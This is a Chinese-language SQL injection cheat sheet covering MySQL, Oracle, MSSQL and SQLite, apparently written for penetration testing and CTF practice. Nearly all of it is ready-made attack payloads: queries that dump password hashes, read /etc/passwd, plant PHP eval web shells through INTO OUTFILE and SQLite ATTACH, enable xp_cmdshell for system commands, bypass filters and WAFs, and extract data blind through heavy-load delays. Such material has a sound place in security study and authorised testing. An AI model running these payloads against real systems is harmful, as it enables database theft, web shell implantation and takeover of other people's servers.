# SQL注入备忘录

# 1 MySQL

## 1.1 常用信息及语句

**当前用户：`user()`**
**数据库版本：`version()`**
**数据库名: `database()`**
**操作系统：`@@version_compile_os`**

**所有用户：**

**`select group_concat(user) from mysql.user`**

**用户hash：**

**`select group_concat(password) from mysql.user where user='root'`**

**所有数据库：**

**`SELECT group_concat(schema_name) from information_schema.schemata`**

**表名：**

**`SELECT group_concat(table_name) from information_schema.tables where table_schema='库名'`**

**//表中有主码约束，非空约束等完整性约束条件的才能用这个语句查询出来**

**`SELECT group_concat(table_name) from information_schema.table_constraints where table_schema='库名'`**

**字段名：**

**`SELECT group_concat(column_name) from information_schema.columns where table_name='表名'`**

**读文件：**

**`SELECT load_file('/etc/passwd')`**

**写文件：**

**`SELECT '<?php @eval($_POST[1]);?>' into outfile '/var/www/html/shell.php'`**

## 1.2 UNION注入

### 1.2.1 猜字段长度

**`order by num`**

**Example：`id=1 order by 2` 页面正常，`id=3 order by 6`页面错误，那么字段就是2**
**字符型的话需要注释后面的引号，Example：**
**`id=1' order by 2%23`**

### 1.2.2 暴字段位置

**`and 1=2 UNION SELECT 1,2或 id=-1 UNION SELECT 1,2`**

### 1.2.3 基本语法

**`UNION SELECT 1,password,3 from admin`**

### 1.2.4 过滤了逗号绕过

**`select 1,2,3 where 1=2 union select * from (select version())a join (select database())b join (select database())c;`**

## 1.3 报错注入

**mysql暴错注入方法整理，通过floor，UpdateXml，ExtractValue，NAME_CONST，Error based Double Query Injection等方法**

### 1.3.1 floor

**`?id=1 OR (SELECT 8627 FROM(SELECT COUNT(*),CONCAT(0x70307e,(SELECT user()),0x7e7030,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)`**

### 1.3.2 ExtractValue(有长度限制,最长32位)

**`?id=1 and extractvalue(1, concat(0x7e, (select @@version),0x7e))`**

### 1.3.3 UpdateXml(有长度限制,最长32位)

**`?id=1 and updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1)`**

### 1.3.4 NAME_CONST(适用于低版本，不太好用)

**`?id=261 and 1=(select * from (select NAME_CONST(version(),1),NAME_CONST(version(),1)) as x)`**

### 1.3.5 Error based Double Query Injection

**`?id=1 or 1 group by concat_ws(0x7e,version(),floor(rand(0)*2)) having min(0) or 1`**

### 1.3.6 exp(5.5.5以上)

**`id=1 and (select exp(~(select * from(select user())x)))`**

### 1.3.7 polygon

```mysql
mysql> select * from users where username=""and polygon (password);
ERROR 1367 (22007): Illegal non geometric '`security`.`users`.`password`' value found during parsing
```

## 1.4 BOOL盲注

**盲注的时候一定注意，MySQL4之后大小写不敏感，可使用binary()函数使大小写敏感。**

### 1.4.1 构造布尔条件

**现在很多CTF比赛脑洞都出在了bool条件的构造，花式bool条件构造。**

> **正常情况**

**`'or bool#`**

**`true'and bool#`**

> **不使用空格、注释**

**`'or(bool)='1`**

**`true'and(bool)='1`**

> **不使用or、and、注释**

**`'^!(bool)='1`**

**`'=(bool)='`**

**`'||(bool)='1`**

**`true'%26%26(bool)='1`**

**`'=if((bool),1,0)='0`**

> **不使用等号、空格、注释**

**`'or(bool)<>'0`**

**`'or((bool)in(1))or'0`**

> **其他**

**`or (case when (bool) then 1 else 0 end)`**

**有时候where字句有括号又猜不到SQL语句的时候，可以有下列类似的fuzz**

**`1' or (bool) or '1'='1`**

**`1%' and (bool) or 1=1 and '1'='1`**

**有时候过滤很严格的话可以通过比较操作拖表中数据**

```mysql
mysql> select * from admin where username="" || id=2 && password<"5";
+----+----------+----------+------+
| id | username | password | num  |
+----+----------+----------+------+
|  2 | admin    | 456      |   20 |
+----+----------+----------+------+
1 row in set (0.00 sec)
mysql> select * from admin where username="" || id=3 && password<"8";
+----+----------+----------+------+
| id | username | password | num  |
+----+----------+----------+------+
|  3 | test     | 789      |   30 |
+----+----------+----------+------+
1 row in set (0.00 sec)
mysql> select * from admin where username="" || id=3 && password<"7";
Empty set (0.00 sec)
```

**这样通过id指定的话改一下payload直接上脚本把数据全脱了。**

**另外如果想跨表查询的话**

```mysql
mysql> select a.password<'z' from users a limit 1,1;
+----------------+
| a.password<'z' |
+----------------+
|              1 |
+----------------+
```

### 1.4.2 构造逻辑判断

**逻辑判断基本就那些函数：**

```mysql
left(user(),1)>'r'  
right(user(),1)>'r'  
substr(user(),1,1)='r'  
mid(user(),1,1)='r' 
greatest("sed",database())= "sed" //返回最大值再与字符串比较
select least("sea",database())="sea"; //返回最小值再与字符串比较
    
//不使用逗号 
user() regexp '^[a-z]'
user() like 'root%' //注意_/%通配符，建议写脚本的时候时候写到字符集最后面
POSITION('root' in user())
mid(user() from 1 for 1)='r'
mid(user() from 1)='r'

```

**ASCII()、ORD()和CHAR()函数一般用做辅助。**

### 1.4.3 利用order by盲注

```mysql
mysql> select * from admin where username='' or 1 union select 1,2,'5' order by 3;
+----+----------+----------------------------------+
| id | username | password                         |
+----+----------+----------------------------------+
|  1 | 2        | 5                                |
|  1 | admin    | 51b7a76d51e70b419f60d3473fb6f900 |
+----+----------+----------------------------------+
2 rows in set (0.00 sec)
    
mysql> select * from admin where username='' or 1 union select 1,2,'6' order by 3;
+----+----------+----------------------------------+
| id | username | password                         |
+----+----------+----------------------------------+
|  1 | admin    | 51b7a76d51e70b419f60d3473fb6f900 |
|  1 | 2        | 6                                |
+----+----------+----------------------------------+
2 rows in set (0.01 sec)
```

**这种注入一般出现在登录处，形成bool条件。这里只获取password的值，也可以跟多个UNION查询其他的数据，此方法优点在于不使用括号等号等字符。利用order by姿势很多，自由发挥了。**

### 1.5 延时盲注

**相对于bool盲注，就是把返回值0和1改为是否执行延时，能用其他方法就不使用延时。**
**一般格式`if((bool),sleep(3),0)`和`or (case when (bool) then sleep(3) else 0 end)`**

**两个函数：**

**`BENCHMARK(100000,MD5(1)) or sleep(5)`**

**BENCHMARK()用于测试函数的性能，参数一为次数，二为要执行的表达式。可以让函数执行若干次，返回结果比平时要长，通过时间长短的变化，判断语句是否执行成功。这是一种边信道攻击，在运行过程中占用大量的cpu资源。推荐使用sleep()**

**如果这两个函数ban掉的话可以利用笛卡尔积造成延迟来进行注入。**

**`' and if(ascii(substr((select database()),%d,1))<%d,(SELECT count(*) FROM information_schema.columns A, information_schema.columns B,information_schema.tables C),1)#`**

**另外还可以利用不正确的正则表达式来**

**`select if(substr((select 1)='1',1,1),concat(rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a')) RLIKE '(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+b',1);`**

![sql-1](/Users/linlsec/Desktop/linlsec.github.io/images/Web安全/sql-1.png)

## 1.6 MySQL注释符：

```mysql
1. -- -
2. /* .... */
3. #
4. `
5. ;%00
```

## 1.7 Insert&Update注入

**insert和update一般使用报错注入**

**如果没有错误回显，insert可以使用延时注入：**

**update可以使用bool盲注和延时盲注。**

**还有如果存在insert或者update,更新后的数据是可见的话,那么利用mysql中字符串在与数字进行运算的时候当作是`0`进行运算**

```mysql
mysql> select ''+1;
+------+
| ''+1 |
+------+
|    1 |
+------+
1 row in set (0.00 sec)
```

**那么我们可以利用查询的数据转化为10进制,然后进行运算,拿到我们计算的结果,在进行转化回去即可**

```mysql
mysql> update users set password=''+conv(hex(substr(user(),1 + (1-1) * 8, 6)), 16, 10);
Query OK, 1 row affected (0.00 sec)
Rows matched: 1  Changed: 1  Warnings: 0

mysql> select * from users;
+----+----------+-----------------+
| id | username | password        |
+----+----------+-----------------+
|  1 | admin    | 125822936825964 |
+----+----------+-----------------+
1 row in set (0.00 sec)

mysql> select unhex(conv(125822936825964, 10 ,16));
+--------------------------------------+
| unhex(conv(125822936825964, 10 ,16)) |
+--------------------------------------+
| root@l                               |
+--------------------------------------+
1 row in set (0.00 sec)
```

## 1.8 order by后的注入

### 1.8.1 报错注入

**`1 and extractvalue(1, concat(0x7e, (select @@version),0x7e))`**

### 1.8.2 bool盲注

**`order by IF((bool),1,(select 1 union select 2))`**

### 1.8.3 延时盲注

**不推荐，因为每条数据都会执行延时，能用其他方法就不使用延时。**
**`order by IF(1,sleep(3),0);`**

**两条数据延时了6秒**

## 1.9 表名可控注入

### 1.9.1 表名不完全可控且DESC的表名含有identifier quote,SELECT的表名不含identifier quote

```mysql
mysql_connect("localhost","root","root");
mysql_query("use b2cshop");
$table = $_GET['table'];
mysql_query("desc `shop_{$table}`") or die("DESC 出错:".mysql_error());
$sql = "select * from shop_{$table} where 1=1";
echo $sql;
echo "<br><br><br><br><br><br><br>";
var_dump(mysql_fetch_array(mysql_query("$sql")));
echo mysql_error();
```

**shop_users 后面的两个``,做了shop_users 表的别名,所以无影响。**
**这时候desc的语句为:**

```mysql
desc `shop_users` `where updatexml(1,concat(0x5e24,(select user()),0x5e24),1)#`
```

### 1.9.2 表名不完全可控且DESC的表名不含identifier quote,SELECT的表名含有identifier quote

```mysql
mysql_connect("localhost","root","root");
mysql_query("use b2cshop");
$table = $_GET['table'];
mysql_query("desc shop_{$table}") or die("DESC 出错:".mysql_error());
$sql = "select * from `shop_{$table}` where 1=1";
echo $sql;
echo "<br><br><br><br><br><br><br>";
var_dump(mysql_fetch_array(mysql_query("$sql")));
echo mysql_error();
```

## 1.10 无列名注入

### 1.10.1 别名

**`union (select 1,2,c from (select 1,2 c union select * from flag)b) limit 1,1`**

**或者**

**`union (select 1,2,c from (select 1,2 as c union select * from flag) as b) limit 1,1`**

**或者绕过逗号**

```mysql
select c from (select * from (select 1 `a`)m join (select 0 `i`)o join (select 2 `b`)n join (select 3 `c`)t where 0 union select * from flag)x;
```

### 1.10.2 变量

**需要一个请求两个注入**

## 1.11 可报错时爆表名、字段名、库名

### 1.11.1 字段名

**上文介绍可以使用无列明注入，但是如果再进行限制,不允许使用union 该怎么破呢？**

**`select * from admin where id=1 and (select * from (select * from admin as a join admin as b) as c)`**

**把当前表第一个字段成功爆出来了。**

**这个的原理就是在使用别名的时候，表中不能出现相同的字段名，于是我们就利用join把表扩充成两份，在最后别名c的时候 查询到重复字段，就成功报错。**

**同时，可以利用using爆其他字段：**

### 1.11.2 表名

**翻阅mysql的文档发现了一个非常好玩的函数**

**Polygon(ls1, ls2, …)**

**Polygon从多个LineString或WKB LineString参数 构造一个值 。如果任何参数不表示LinearRing（也就是说，不是一个封闭和简单的LineString），返回值就是NULL**

**如果传参不是linestring的话，就会爆错，而当如果我们传入的是存在的字段的话，就会爆出已知库、表、列。**

### 1.11.3 库名

**上面的方法已经可以爆出库名了，提供另一个方法**

**`select * from admin where id =1-a()`**

## 1.12 堆叠注入

### 1.12.1 绕过部分waf

**`SET @SQL=0x73656c65637420646174616261736528293b;
PREPARE pord FROM @SQL;EXECUTE pord;`**

### 1.12.2

**思路: 找一处可查询处,利用修改表名来拿数据**

```mysql
';rename table `words` to `xxxx`;rename table `1919810931114514` to `words`;alter table `words` add id int primary key auto_increment;%23
```

# 2 Oracle

## 2.1 常用信息及语句

**注释符：**

**`-- +`**

**当前用户权限：**

**`select * from session_roles`**

**当前数据库版本：**

**`select banner from sys.v_$version where rownum=1`**

**服务器监听IP：**

**`select utl_inaddr.get_host_address from dual`**

**服务器操作系统：**

**`select member from v$logfile where rownum=1`**

**服务器sid：**

**`select instance_name fromv$instance`**

**当前连接用户：**

```mysql
select SYS_CONTEXT ('USERENV', 'CURRENT_USER')from dual
```

**获取数据库名：**

```mysql
select owner from all_tables where rownum=1
依次爆出所有数据库名，假设第一个库名为first_dbname哪个第二个库select owner from all_tables where rownum=1 and owner<>'first_dbname'依次类推
```

**获取表名：**

```mysql
select table_name from user_tables where rownum=1，依次爆出所有表类似暴库。
```

**获取字段名：**

```mysql
select column_name from user_tab_columns where table_name='tablename' and rownum=1，依次爆出所有字段类似暴库。
```

## 2.2 报错注入

```mysql
AND 2=UTL_INADDR.GET_HOST_ADDRESS(CHR(126)|(SLQ语句)|CHR(126))
```

## 2.3 踩的一些坑

**Oracle比较玄学，能用SQLmap绝不手工，但测试中总会遇到必须用手工的，比如xml中的一个参数注入(当然也可以写tamper脚本)，总结一下自己踩到的坑。**

### 2.3.1 UNION每个字段类型必须相同

**比如，原先的语句是这样：**

```mysql
select 1,'2','3' from dual
```

**那么后面的UNION也必须是int,char,char才行。**

**可以通过下面方法确定各个字段的类型。**

```mysql
and 1=2 union select 'null',null,null,null,null,null from dual
```

**如此依次将下面的每个null用单引号替换，查看返回页面，返回正常说明那个字段为字符型。确定所有字段类型后就可以注入了， 是字符型的就用’null’，数字型的就直接null**

### 2.3.2 必须跟FROM

**Oracle的每个查询必须跟from，Oracle本身有个虚拟表dual，测试的时候可以使用。**

# 3 MSSQL

**SQLserver也有点玄学，每个版本的系统内置表不一样，测试的时候很蛋疼。并且SQLserver的使用者参差不齐，网上回答很乱，有时间自己装上各个版本再专门总结。**

## 3.1 常用信息及语句

**数据库版本：**
`select @@VERSION`

**数据库名：**
`select db_name()`

**数据库ip地址：**
`select local_net_address from sys.dm_exec_connextions where Session_id=@@spid`

**暴当前表中的列：**

```mysql
article.asp?id=6 group by admin.username having 1=1--
article.asp?id=6 group by admin.username,admin.password having 1=1--
```

**暴任意表和列：**

```mysql
and (select top 1 name from (select top N id,name from sysobjects where xtype=char(85)) T order by id desc)>1
and (select top col_name(object_id('admin'),N) from sysobjects)>1
```

**暴数据库数据：**

```mysql
and (select top 1 password from admin where id=N)>1
```

## 3.2 报错注入

**MSSQL一般使用类型转换导致的报错注入**

## 3.3 执行命令

```mysql
;declare @d int //是否支持多行
```

**如果支持多行语句执行并且是sa权限可以直接执行系统命令。**

**开启xp_cmdshell:**

```mysql
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure'xp_cmdshell', 1;
RECONFIGURE;
```

**关闭xp_cmdshell:**

```mysql
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure'xp_cmdshell', 0;
RECONFIGURE;
```

**执行命令格式：**

```mysql
xp_cmdsehll('whoami');
```

# 4 SQLite

## 4.1 常用信息及语句

**数据库版本：**
`select sqlite_version()`

**获取所有表名：**
`SELECT name FROM sqlite_master WHERE type='table'`

**所有表结构(包含字段名，表名)：**
`SELECT sql FROM sqlite_master WHERE type='table'`

**注释符：**
`--`

盲注常用函数：`substr()（没有mid、left等函数），判断长度函数length()`

## 4.2 BOOL盲注

**bool条件构造和MySQL一样，但是亦或运算的Payload不可用，注释符使用–。**

**逻辑判断目前我就翻到一个substr()，应用实例：**
`cond='FALSE' or (substr('abc',1,1)='a')`

## 4.3 延时盲注

**sqlite没有类似sleep()的函数，但有个函数randomblob(N)，生成N个任意字符，可以造成延时。**

**SQLite没有if，可以使用case when … then …**

**格式`cond='true' AND 1=(case when (bool) then randomblob(100000000) else 0 end)`**
**100000000个字符就有明显延时了。**

**注意cond为真，并且不要有太多条数据，因为有一条数据就会执行一次`randomblob(100000000)`，如果数据很多的话，服务器直接挂了。可以首先判断一下数据量，再确定N的值，比如我这里有100多条数据，就可以 `id='' or 1 AND 1=randomblob(1000000)`这样，把N的值缩小100倍。灵活运用。**

**运用实例：**

```mysql
' or 1 and 1=(case when substr('abc',1,1)='a' then randomblob(1000000) else 0 end)--
```

## 4.4 写文件

**需要直接访问数据库，或堆叠查询选项启用（默认关闭）**

```mysql
';ATTACH DATABASE '/tmp/p0.php' AS p0;CREATE TABLE p0.shell (data text);INSERT INTO p0.shell (data) VALUES ('<?php eval($_POST[1]);?>');--
```

**root权限的话可以写计划任务和公钥，参考redis未授权访问利用。**

## 4.5 读文件

**只能用在Windows上，需要特殊配置。**

```mysql
load_extension(library_file,entry_point)
```

